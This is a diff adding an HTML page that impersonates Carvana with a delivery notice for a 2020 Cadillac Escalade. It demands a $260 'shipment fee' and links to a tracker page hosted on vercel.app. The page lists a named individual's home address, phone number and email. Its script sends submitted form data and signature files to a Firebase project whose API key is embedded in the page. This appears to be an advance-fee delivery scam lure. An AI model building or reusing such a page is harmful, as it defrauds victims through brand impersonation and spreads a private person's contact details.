@@ -1,0 +1,336 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>notification of Vehicle Delivery Receipt</title>
+  <style>
+    @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&display=swap');
+    :root {
+      --primary-color: #005f73;
+      --secondary-color: #94d2bd;
+      --accent-color: #0a9396;
+      --light-bg: #e0fbfc;
+      --text-color: #333;
+    }
+
+    body {
+      font-family: 'Inter', sans-serif;
+      background: #f0f4f8;
+      margin: 0;
+      overflow-x: hidden;
+    }
+    header, footer {
+      background: linear-gradient(to right, #1e3a8a, #2563eb);
+      color: white;
+      text-align: center;
+      padding: 0.2rem 0.3rem;
+      position: relative;
+    }
+    header::before, footer::after {
+      content: "";
+      background: url('https://cdn.pixabay.com/photo/2012/04/14/14/04/car-34283_1280.png') no-repeat center center;
+      background-size: 100px;
+      position: absolute;
+      width: 100px;
+      height: 50px;
+      top: 50%;
+      transform: translateY(-50%);
+      animation: drive 10s linear infinite;
+      opacity: 0.3;
+    }
+    header::before {
+      left: -120px;
+      animation-name: drive-left;
+    }
+    footer::after {
+      right: -120px;
+      animation-name: drive-right;
+    }
+    @keyframes drive-left {
+      0% { left: -120px; }
+      100% { left: 100%; }
+    }
+    @keyframes drive-right {
+      0% { right: -120px; }
+      100% { right: 100%; }
+    }
+    main {
+      max-width: 850px;
+      margin: 2rem auto;
+      background: #fff;
+      padding: 2rem;
+      border-radius: 10px;
+      box-shadow: 0 4px 12px rgba(0,0,0,0.1);
+    }
+    h2 {
+      margin-top: 0.5rem;
+      font-size: 1.3rem;
+      color: #1e3a8a;
+    }
+    input, textarea, button {
+      width: 100%;
+      padding: 0.75rem;
+      margin-top: 0.5rem;
+      border: 1px solid #ccc;
+      border-radius: 6px;
+      font-size: 1rem;
+    }
+    input[type="file"] {
+      padding: 0;
+    }
+    button {
+      background: #2563eb;
+      color: #fff;
+      border: none;
+      cursor: pointer;
+      margin-top: 1.5rem;
+      transition: background 0.3s ease;
+    }
+    button:hover {
+      background: #1d4ed8;
+    }
+    table {
+      width: 100%;
+      border-collapse: collapse;
+      margin-top: 1rem;
+    }
+    td, th {
+      border: 1px solid #ccc;
+      padding: 0.5rem;
+      text-align: left;
+    }
+    .section {
+      margin-top: 2rem;
+      padding-bottom: 1.5rem;
+      border-bottom: 1px solid #e0e0e0;
+    }
+    .carousel {
+      display: flex;
+      overflow-x: auto;
+      gap: 1rem;
+      margin: 1rem 0;
+    }
+    .carousel img {
+      width: 100%;
+      max-width: 160px;
+      border-radius: 10px;
+      box-shadow: 0 2px 8px rgba(0,0,0,0.1);
+    }
+    .logo-frame {
+      display: none;
+    }
+.logo-container {
+  margin: 0 auto 1rem auto;
+  width: 100px;
+  height: 100px; /* Ensures it’s a perfect square */
+  border-radius: 50%;
+  border: 3px solid white;
+  overflow: hidden;
+  background: white;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+}
+
+.logo-container img {
+  width: 100%;
+  height: 100%;
+  object-fit: cover; /* Fills the container neatly */
+  display: block;
+}
+    .track-btn {
+      display: inline-block;
+      background-color: var(--accent-color);
+      color: white;
+      padding: 12px 25px;
+      text-decoration: none;
+      border-radius: 8px;
+      font-weight: bold;
+      margin-top: 20px;
+      transition: 0.3s ease;
+      text-align: center;
+    }
+    .track-btn:hover {
+      background-color: var(--primary-color);
+    }
+
+  </style>
+  <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
+  <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-firestore-compat.js"></script>
+  <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-storage-compat.js"></script>
+</head>
+<body>
+  <header>
+    <div class="logo-container">
+      <img src="https://sharlie.boisedev.com/wp-content/uploads/2023/06/carvana-791x791.png" alt="Company Logo">
+    </div>
+    <h1>Notification: Vehicle Delivery Pending Payment of Shipment 🚗</h1>
+  </header>
+
+  <main>
+
+
+    <div class="section">
+      <h2>Client Information</h2>
+      <p><strong>Name:</strong> Sonya Miller</p>
+      <p><strong>Address:</strong> 5433 Talus Trace Lane Charlotte nc 28215</p>
+      <p><strong>Phone:</strong> +1 7049499306</p>
+      <p><strong>Email:</strong> starrmiller579@gmail.com</p>
+    </div>
+
+<div class="section">
+  <h2>Vehicle Information 🚗</h2>
+  <p><strong>Make:</strong> Cadillac</p>
+  <p><strong>Model:</strong> Escalade</p>
+  <p><strong>Year:</strong> 2020</p>
+  <p><strong>Exterior Color:</strong> Black</p>
+  <p><strong>Interior Color:</strong> Jet Black</p>
+  <p><strong>Engine:</strong> 420 hp 6.2L V8</p>
+  <p><strong>Transmission:</strong> 10-Speed Automatic</p>
+  <p><strong>Mileage:</strong> 52,100 mi</p>
+  <p><strong>Drivetrain:</strong> Four-Wheel Drive</p>
+  <p><strong>VIN:</strong> 1GYS4CKJ5LR123456</p>
+  <p><strong>Stock Number:</strong> 20256</p>
+</div>
+
+<div class="section">
+  <h2>Fuel Economy ⛽</h2>
+  <p><strong>Fuel Tank Size:</strong> 26 gal</p>
+  <p><strong>Combined Gas Mileage:</strong> 17 MPG</p>
+  <p><strong>City Gas Mileage:</strong> 14 MPG</p>
+  <p><strong>Highway Gas Mileage:</strong> 21 MPG</p>
+  <p><strong>Fuel Type:</strong> Gasoline</p>
+</div>
+
+<div class="section">
+  <h2>Safety Features 🛡️</h2>
+  <ul>
+    <li>ABS Brakes</li>
+    <li>Adaptive Cruise Control</li>
+    <li>Backup Camera</li>
+    <li>Blind Spot Monitoring</li>
+    <li>Lane Keep Assist</li>
+    <li>Front and Rear Parking Sensors</li>
+    <li>Driver & Passenger Airbags</li>
+    <li>Forward Collision Alert</li>
+    <li>Surround Vision</li>
+  </ul>
+</div>
+
+<div class="section">
+  <h2>Measurements 📏</h2>
+  <p><strong>Doors:</strong> 4 doors</p>
+  <p><strong>Front Legroom:</strong> 45.3 in</p>
+  <p><strong>Back Legroom:</strong> 39.0 in</p>
+  <p><strong>Cargo Volume:</strong> 15.2 cu ft (behind third row)</p>
+</div>
+
+<div class="section">
+  <h2>Pricing Details</h2>
+  <table>
+    <tr><th>Item</th><th>Amount</th></tr>
+    <tr><td>Shipment Fee</td><td>$260 - Pending</td></tr>
+    <tr><th>Total Amount Due</th><th>$260</th></tr>
+  </table>
+</div>
+
+<div class="section">
+  <h2>Pre-Delivery Inspection Checklist 🚗</h2>
+  <table>
+    <tr><th>Item</th><th>Condition</th></tr>
+    <tr><td>Exterior (no damage)</td><td>✅ Good</td></tr>
+    <tr><td>Interior Cleanliness</td><td>✅ Good</td></tr>
+    <tr><td>Tire Condition</td><td>✅ Good</td></tr>
+    <tr><td>Lights/Signals Working</td><td>✅ Yes</td></tr>
+    <tr><td>Keys & Documents Provided</td><td>✅ Yes</td></tr>
+  </table>
+</div>
+
+    <div class="section">
+      <h2>Car Image Gallery</h2>
+      <div class="carousel">
+        <img class="slides" src="https://images.hgmsites.net/lrg/2020-cadillac-escalade-2wd-4-door-luxury-angular-front-exterior-view_100721645_l.jpg" alt="Cadillac Front View">
+        <img class="slides" src="https://www.dimmitt.com/blogs/3093/wp-content/uploads/2019/09/dimmitt-automotive-2020-cadillac-escalade-interior.jpg" alt="Cadillac Side View">
+        <img class="slides" src="https://www.servicegm.com/blogs/1652/wp-content/uploads/2020/06/escalade2.jpg" alt="Ford F-100 Vintage Red">
+        <img class="slides" src="https://www.marshallgoldman.com/imagetag/2482/38/l/Used-2020-Cadillac-Escalade-Platinum-4WD-1658338631.jpg" alt="Cadillac Rear">
+        <img class="slides" src="https://c8.alamy.com/comp/2BCWNN6/montreal-canada-april-4-2020-cadillac-escalade-black-car-at-dealership-cadillac-is-a-division-of-american-automobile-manufacturer-general-motors-2BCWNN6.jpg" alt="Cadillac Blue Classic">
+        <img class="slides" src="https://i.redd.it/rwfsm329fa291.jpg" alt="Cadillac Front View">   
+      </div>
+    </div>
+
+    <div class="section">
+      <h2>Delivery Details</h2>
+      <p><strong>Shippment Date: </strong> Awaiting payment</p>
+      <p><strong>Delivery Time: </strong> Pending</p>
+      <p><strong>Delivery Location: </strong> 5433 Talus Trace Lane Charlotte nc 28215</p>
+      <p><strong>Delivered By: </strong> FedEx delivery</p>
+    </div>
+
+      <div class="section">
+        <h2>Client Acknowledgment</h2>
+        <p>In the shippment paper client will confirm that he/she have received the above vehicle in the listed condition, with all necessary documents and keys. he/she must have inspected the vehicle and acknowledge its delivery/conditions.</p>
+      </div>
+
+      <div class="section">
+        <h2>Delivery Agent Acknowledgment</h2>
+        <p>Agent will confirm that he/she have delivered the vehicle to the above client at the stated location and time.</p>
+
+        <p>on the specified date</p>
+      </div>
+    </form>
+  <div class="section">
+    <h2>Awaiting Shipping Tracker</h2>
+    <a href="https://tracker-smoky.vercel.app/Stacy Lavet Walker.html" class="track-btn">🚚 Track Your Shipping</a>
+  </div>
+  </main>
+  <footer>
+    &copy; CARVANNA Motors 🚗🚗. All rights reserved.
+  </footer>
+
+<script type="module">
+  import { initializeApp } from "https://www.gstatic.com/firebasejs/9.22.1/firebase-app.js";
+  import { getFirestore, collection, addDoc } from "https://www.gstatic.com/firebasejs/9.22.1/firebase-firestore.js";
+  import { getStorage, ref, uploadBytes, getDownloadURL } from "https://www.gstatic.com/firebasejs/9.22.1/firebase-storage.js";
+
+  const firebaseConfig = {
+    apiKey: "AIzaSyB04Q7-e0nPnhoDt4tBy2T23iWt4p_nLaw",
+    authDomain: "cars-11683.firebaseapp.com",
+    databaseURL: "https://cars-11683-default-rtdb.firebaseio.com",
+    projectId: "cars-11683",
+    storageBucket: "cars-11683.appspot.com",  // ✅ Corrected
+    messagingSenderId: "884218610939",
+    appId: "1:884218610939:web:824c4d711bda9a67d15c5e"
+  };
+
+  const app = initializeApp(firebaseConfig);
+  const db = getFirestore(app);
+  const storage = getStorage(app);
+
+  document.getElementById('deliveryForm').addEventListener('submit', async function(e) {
+    e.preventDefault();
+    const formData = new FormData(this);
+    const data = {};
+    formData.forEach((value, key) => data[key] = value);
+    data.idVerified = formData.get('idVerified') ? true : false;
+
+    const file = formData.get('signature');
+    const storageRef = ref(storage, `signatures/${Date.now()}_${file.name}`);
+
+    try {
+      const snapshot = await uploadBytes(storageRef, file);
+      const signatureURL = await getDownloadURL(snapshot.ref);
+      data.signatureURL = signatureURL;
+
+      await addDoc(collection(db, 'carDeliveries'), data);
+      alert('Delivery form submitted successfully.');
+      this.reset();
+    } catch (error) {
+      alert('Error submitting form: ' + error.message);
+      console.error(error);
+    }
+  });
+</script>
+
+</body>
+</html>
